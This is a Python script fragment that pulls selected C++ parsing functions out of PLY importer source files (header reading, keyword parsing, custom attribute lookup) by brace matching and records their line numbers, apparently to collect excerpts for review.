def find_line(text, anchor):
    idx = text.index(anchor)
    return text.rfind("\n", 0, idx) + 1


def extract_func(text, anchor):
    """Extract a whole function (through its outer closing brace) that
    contains `anchor`, starting at the beginning of its signature line."""
    start = find_line(text, anchor)
    i = text.index("{", start)
    depth = 0
    j = i
    while True:
        c = text[j]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                break
        j += 1
    return text[start:j + 1], text[:start].count("\n") + 1


def main():
    ply_import = open(PLY_IMPORT_CC).read()
    gsplat = open(PLY_GSPLAT_CC).read()

    pieces = []  # (description, code)

    for anchor, desc in [
        ("static bool parse_keyword(Span<char> &str", "parse_keyword"),
        ("static Span<char> parse_word(Span<char> &str)", "parse_word"),
        ("static void skip_space(Span<char> &str)", "skip_space"),
        ("static PlyDataTypes type_from_string(Span<char> word)", "type_from_string"),
        ("const char *read_header(PlyReadBuffer &file", "read_header"),
    ]:
        code, line = extract_func(ply_import, anchor)
        pieces.append((f"ply_import.cc:{line} ({desc})", code))

    code, line = extract_func(gsplat, "static std::optional<Span<float>> find_custom_attribute")
    pieces.append((f"ply_import_gsplat.cc:{line} (find_custom_attribute)", code))

